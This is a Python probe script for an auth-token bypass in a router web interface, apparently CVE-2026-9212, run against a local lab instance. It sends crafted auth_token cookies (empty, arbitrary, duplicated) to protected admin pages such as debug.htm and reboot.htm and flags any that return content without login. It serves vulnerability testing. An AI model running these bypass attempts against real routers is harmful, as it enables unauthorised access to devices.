#!/usr/bin/env python3
"""Read-only CVE-2026-9212 auth-token variant probes for the isolated RAX36S lab."""

from __future__ import annotations

import http.client
from http.cookies import SimpleCookie


HOST = "127.0.0.1"
PORT = 25137


def request(path: str, cookie: str | None = None) -> tuple[int, dict[str, str], bytes]:
    connection = http.client.HTTPConnection(HOST, PORT, timeout=8)
    headers = {"Host": "routerlogin.net", "Connection": "close"}
    if cookie is not None:
        headers["Cookie"] = cookie
    try:
        connection.request("GET", path, headers=headers)
        response = connection.getresponse()
        body = response.read(1024 * 1024)
        return response.status, dict(response.getheaders()), body
    finally:
        connection.close()


def auth_cookie(headers: dict[str, str]) -> str | None:
    raw = headers.get("Set-Cookie")
    if not raw:
        return None
    parsed = SimpleCookie()
    parsed.load(raw)
    morsel = parsed.get("auth_token")
    return f"auth_token={morsel.value}" if morsel else None


def classify(status: int, body: bytes) -> str:
    lowered = body.lower()
    if status == 401 or b"unauthorized" in lowered:
        return "auth-required"
    if b"admin_login" in lowered or b"multi_login" in lowered:
        return "login-page"
    return "content"


def main() -> int:
    unauth_status, unauth_headers, _ = request("/unauth.cgi")
    issued = auth_cookie(unauth_headers)
    print(f"unauth.cgi status={unauth_status} issued_cookie={issued!r}")
    cookie_cases = (
        ("none", None),
        ("empty", "auth_token="),
        ("arbitrary", "auth_token=FRIDAY_INVALID_TOKEN"),
        ("duplicate-first-invalid", "auth_token=FRIDAY_INVALID_TOKEN; auth_token="),
        ("duplicate-last-invalid", "auth_token=; auth_token=FRIDAY_INVALID_TOKEN"),
        ("unauth-issued", issued),
    )
    protected_paths = (
        "/debug.htm",
        "/hidden_info.htm",
        "/POT.htm",
        "/StringTableUpload.html",
        "/enable_string_table.html",
        "/currentsetting.htm",
        "/reboot.htm",
    )
    bypass = False
    for path in protected_paths:
        baseline = None
        for name, cookie in cookie_cases:
            status, _, body = request(path, cookie)
            result = classify(status, body)
            if name == "none":
                baseline = result
            elif baseline in {"auth-required", "login-page"} and result == "content":
                bypass = True
            print(
                f"path={path} case={name} status={status} "
                f"bytes={len(body)} class={result}"
            )
    health_status, _, health_body = request("/unauth.cgi")
    healthy = health_status == 200 and b"enable_recovery" in health_body
    print(f"auth_bypass_candidate={str(bypass).lower()} healthy={str(healthy).lower()}")
    return 1 if bypass or not healthy else 0


if __name__ == "__main__":
    raise SystemExit(main())
